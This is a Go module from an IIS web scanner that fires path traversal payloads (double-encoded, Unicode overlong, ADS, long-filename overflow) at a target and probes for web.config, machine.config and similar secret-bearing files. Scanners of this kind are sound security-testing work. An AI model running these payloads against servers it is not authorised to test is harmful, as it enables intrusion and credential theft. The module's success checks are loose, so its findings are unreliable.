package modules

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/ibrahmsql/issmap/pkg/http"
)

// PathTraversalModule IIS-specific path traversal zafiyetlerini tespit eder
type PathTraversalModule struct {
	*BaseModule
	client   *http.Client
	baseURL  string
	payloads []PathTraversalPayload
}

// PathTraversalPayload path traversal payload yapısı
type PathTraversalPayload struct {
	Name        string
	Payload     string
	Description string
	Encoding    string
	Method      string
}

// NewPathTraversalModule yeni path traversal modülü oluşturur
func NewPathTraversalModule(client *http.Client, baseURL string) *PathTraversalModule {
	module := &PathTraversalModule{
		BaseModule: NewBaseModule("IIS Path Traversal", "IIS-specific path traversal vulnerability detection"),
		client:     client,
		baseURL:    baseURL,
	}
	module.initPayloads()
	return module
}

// initPayloads path traversal payload'larını başlatır
func (m *PathTraversalModule) initPayloads() {
	m.payloads = []PathTraversalPayload{
		// Double encoding attacks
		{
			Name:        "Double Encoded Directory Traversal",
			Payload:     "%252e%252e%252f",
			Description: "Double URL encoded directory traversal (../) bypass",
			Encoding:    "double-url",
			Method:      "GET",
		},
		{
			Name:        "Double Encoded Backslash",
			Payload:     "%252e%252e%255c",
			Description: "Double URL encoded backslash directory traversal",
			Encoding:    "double-url",
			Method:      "GET",
		},
		// Unicode directory traversal
		{
			Name:        "Unicode Directory Traversal 1",
			Payload:     "%c0%af",
			Description: "Unicode encoding for forward slash (/) - CVE-2000-0884",
			Encoding:    "unicode",
			Method:      "GET",
		},
		{
			Name:        "Unicode Directory Traversal 2",
			Payload:     "%c1%9c",
			Description: "Unicode encoding for backslash (\\) - CVE-2000-0884",
			Encoding:    "unicode",
			Method:      "GET",
		},
		{
			Name:        "Unicode Overlong Encoding",
			Payload:     "%c0%2e%c0%2e%c0%af",
			Description: "Unicode overlong encoding for ../ sequence",
			Encoding:    "unicode-overlong",
			Method:      "GET",
		},
		// IIS 5.0 canonical path bypass
		{
			Name:        "IIS 5.0 Canonical Path Bypass",
			Payload:     ".\\..\\..\\..\\",
			Description: "IIS 5.0 canonical path bypass using backslashes",
			Encoding:    "none",
			Method:      "GET",
		},
		{
			Name:        "IIS Dot Slash Bypass",
			Payload:     "./../../../../../../",
			Description: "IIS dot-slash directory traversal",
			Encoding:    "none",
			Method:      "GET",
		},
		// Alternate Data Streams (ADS)
		{
			Name:        "ADS Directory Traversal",
			Payload:     "..\\..\\..\\boot.ini::$DATA",
			Description: "Alternate Data Streams exploitation for file access",
			Encoding:    "ads",
			Method:      "GET",
		},
		{
			Name:        "ADS Hidden File Access",
			Payload:     "web.config::$DATA",
			Description: "ADS access to hidden configuration files",
			Encoding:    "ads",
			Method:      "GET",
		},
		// Long filename buffer overflow
		{
			Name:        "Long Filename Buffer Overflow",
			Payload:     strings.Repeat("A", 8192) + "\\..\\..\\",
			Description: "Long filename buffer overflow attempt",
			Encoding:    "buffer-overflow",
			Method:      "GET",
		},
		// Mixed encoding attacks
		{
			Name:        "Mixed Encoding Attack 1",
			Payload:     "%2e%2e/%2e%2e/%2e%2e/",
			Description: "Mixed URL encoding directory traversal",
			Encoding:    "mixed",
			Method:      "GET",
		},
		{
			Name:        "Mixed Encoding Attack 2",
			Payload:     "..%2f..%2f..%2f",
			Description: "Partial URL encoding directory traversal",
			Encoding:    "mixed",
			Method:      "GET",
		},
		// IIS-specific file access attempts
		{
			Name:        "Windows System File Access",
			Payload:     "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			Description: "Attempt to access Windows system files",
			Encoding:    "none",
			Method:      "GET",
		},
		{
			Name:        "IIS Log File Access",
			Payload:     "..\\..\\..\\inetpub\\logs\\LogFiles\\",
			Description: "Attempt to access IIS log files",
			Encoding:    "none",
			Method:      "GET",
		},
	}
}

// Run path traversal taramasını çalıştırır
func (m *PathTraversalModule) Run(client *http.Client) (*ModuleResult, error) {
	m.Start()
	defer m.End()

	var vulnerabilities []Vulnerability
	var info []Information

	// Test each payload
	for _, payload := range m.payloads {
		vuln := m.testPayload(payload)
		if vuln != nil {
			vulnerabilities = append(vulnerabilities, *vuln)
		}
		time.Sleep(100 * time.Millisecond) // Rate limiting
	}

	// Test common sensitive files
	sensitiveFiles := []string{
		"web.config",
		"global.asax",
		"global.asa",
		"machine.config",
		"app.config",
		"connectionstrings.config",
		"appsettings.json",
	}

	for _, file := range sensitiveFiles {
		vuln := m.testSensitiveFileAccess(file)
		if vuln != nil {
			vulnerabilities = append(vulnerabilities, *vuln)
		}
	}

	// Add informational findings
	info = append(info, CreateInformation(
		"scan_info",
		"Path Traversal Scan Completed",
		fmt.Sprintf("Tested %d path traversal payloads", len(m.payloads)),
		fmt.Sprintf("%d payloads tested", len(m.payloads)),
	))

	status := "completed"
	if len(vulnerabilities) > 0 {
		status = "vulnerabilities_found"
	}

	return m.CreateResult(status, vulnerabilities, info, nil), nil
}

// testPayload belirli bir payload'ı test eder
func (m *PathTraversalModule) testPayload(payload PathTraversalPayload) *Vulnerability {
	m.IncrementRequests()

	// Construct test URL
	testURL := m.constructTestURL(payload.Payload)
	
	resp, err := m.client.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	// Check for successful traversal indicators
	if m.isTraversalSuccessful(resp, payload) {
		return &Vulnerability{
			ID:          fmt.Sprintf("IIS-PATH-TRAVERSAL-%s", strings.ToUpper(payload.Encoding)),
			Title:       fmt.Sprintf("IIS Path Traversal - %s", payload.Name),
			Description: payload.Description,
			Severity:    "HIGH",
			CVSS:        7.5,
			CWE:         "CWE-22",
			OWASP:       "A01:2021 – Broken Access Control",
			URL:         testURL,
			Method:      payload.Method,
			Payload:     payload.Payload,
			Evidence:    fmt.Sprintf("Response status: %d", resp.StatusCode),
			References: []string{
				"https://owasp.org/www-community/attacks/Path_Traversal",
				"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0884",
			},
			Remediation: "Implement proper input validation and sanitization. Use whitelisting for allowed characters and paths.",
			Metadata: map[string]string{
				"encoding_type": payload.Encoding,
				"payload_type":  "path_traversal",
			},
		}
	}

	return nil
}

// testSensitiveFileAccess hassas dosya erişimini test eder
func (m *PathTraversalModule) testSensitiveFileAccess(filename string) *Vulnerability {
	m.IncrementRequests()

	traversalPaths := []string{
		"../../../../../../../",
		"..\\..\\..\\..\\..\\..\\",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2f",
		"%252e%252e%252f%252e%252e%252f",
	}

	for _, traversal := range traversalPaths {
		testURL := m.baseURL + "/" + traversal + filename
		
		resp, err := m.client.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 && m.containsSensitiveContent(resp, filename) {
			return &Vulnerability{
				ID:          "IIS-SENSITIVE-FILE-ACCESS",
				Title:       fmt.Sprintf("Sensitive File Access - %s", filename),
				Description: fmt.Sprintf("Sensitive file %s is accessible via path traversal", filename),
				Severity:    "CRITICAL",
				CVSS:        9.1,
				CWE:         "CWE-22",
				OWASP:       "A01:2021 – Broken Access Control",
				URL:         testURL,
				Method:      "GET",
				Payload:     traversal + filename,
				Evidence:    fmt.Sprintf("File %s accessible with status %d", filename, resp.StatusCode),
				References: []string{
					"https://owasp.org/www-community/attacks/Path_Traversal",
				},
				Remediation: "Restrict access to sensitive configuration files and implement proper path validation.",
				Metadata: map[string]string{
					"file_type":    "sensitive_config",
					"payload_type": "path_traversal",
				},
			}
		}
	}

	return nil
}

// constructTestURL test URL'sini oluşturur
func (m *PathTraversalModule) constructTestURL(payload string) string {
	baseURL, _ := url.Parse(m.baseURL)
	
	// Try different endpoints
	endpoints := []string{
		"/",
		"/default.aspx",
		"/index.asp",
		"/test.asp",
	}

	// Use first endpoint for now
	testPath := endpoints[0] + payload + "boot.ini"
	baseURL.Path = testPath
	
	return baseURL.String()
}

// isTraversalSuccessful traversal başarısını kontrol eder
func (m *PathTraversalModule) isTraversalSuccessful(resp *http.Response, payload PathTraversalPayload) bool {
	// Check status codes that might indicate success
	successCodes := []int{200, 206, 301, 302}
	for _, code := range successCodes {
		if resp.StatusCode == code {
			return true
		}
	}

	// Check for error messages that might indicate file system access
	errorIndicators := []string{
		"system cannot find the file",
		"access denied",
		"file not found",
		"directory listing",
	}

	responseText := strings.ToLower(resp.Header.Get("X-Error-Message"))
	for _, indicator := range errorIndicators {
		if strings.Contains(responseText, indicator) {
			return true
		}
	}

	return false
}

// containsSensitiveContent hassas içerik kontrolü
func (m *PathTraversalModule) containsSensitiveContent(resp *http.Response, filename string) bool {
	contentType := resp.Header.Get("Content-Type")
	
	// Check for configuration file indicators
	configIndicators := map[string][]string{
		"web.config": {"<configuration>", "<appSettings>", "<connectionStrings>"},
		"global.asax": {"<%@", "Application_", "Session_"},
		"machine.config": {"<configuration>", "<system.web>", "<machineKey>"},
		"appsettings.json": {"{", "\"ConnectionStrings\"", "\"Logging\""},
	}

	if indicators, exists := configIndicators[filename]; exists {
		for _, indicator := range indicators {
			if strings.Contains(strings.ToLower(resp.Header.Get("Content-Preview")), strings.ToLower(indicator)) {
				return true
			}
		}
	}

	// Check content type
	if strings.Contains(contentType, "text/") || strings.Contains(contentType, "application/") {
		return true
	}

	return false
}
